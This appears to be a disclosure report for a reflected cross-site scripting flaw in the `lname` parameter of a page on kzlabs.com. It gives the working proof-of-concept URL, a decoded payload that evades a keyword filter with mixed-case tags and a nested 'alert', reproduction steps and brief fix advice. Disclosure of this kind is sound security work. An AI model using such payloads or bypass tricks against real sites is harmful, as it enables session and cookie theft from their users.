# Reflected Cross-Site Scripting (XSS) via `lname` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `lname` parameter of the application. User-controlled input is reflected into the HTML response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

The vulnerability can be exploited using a crafted `<script>` payload with mixed-case tag bypass techniques.

---

## Vulnerable Endpoint

```text id="v7m2qa"
http://kzlabs.com/10.php?fname=aaaa&lname=%22xicorr%3E%3CsCript%3Ealealertrt%28%22xicorXSS2%22%29%3C%2FsCript%3E
```

---

## Vulnerable Parameter

```text id="r4x8zn"
lname
```

---

## Payload Used

```html id="k9c1wp"
"xicorr><sCript>alealertrt("xicorXSS2")</sCript>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/10.php?fname=aaaa&lname=%22xicorr%3E%3CsCript%3Ealealertrt%28%22xicorXSS2%22%29%3C%2FsCript%3E
   ```

2. Observe that the payload is reflected into the HTML response without proper sanitization.

3. The injected script executes automatically in the victim’s browser.

4. A popup dialog displaying `xicorXSS2` confirms successful JavaScript execution.

---

## Proof of Concept

```text id="p5n7md"
http://kzlabs.com/10.php?fname=aaaa&lname=%22xicorr%3E%3CsCript%3Ealealertrt%28%22xicorXSS2%22%29%3C%2FsCript%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/17790ace-a29b-4bf8-869d-d157ef2a1a10" />


---

## Impact

- Session hijacking
- Cookie theft
- JS execution

---

## Recommendations for Fix

- Encode output
- Validate input
- Secure rendering
